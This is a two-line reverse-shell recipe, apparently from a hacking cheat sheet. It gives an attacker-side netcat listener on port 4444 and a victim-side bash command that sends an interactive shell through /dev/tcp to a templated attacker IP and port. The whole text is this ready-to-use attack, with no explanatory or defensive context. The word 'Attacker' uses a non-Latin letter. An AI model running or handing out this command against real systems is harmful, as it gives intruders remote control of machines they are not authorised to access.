**Attaсker:**
_nc -lvnp 4444

**Victim:**
_bash -c 'exec bash -i &>/dev/tcp/{{attacker-ip}}/{{attacker-port}} <&1'
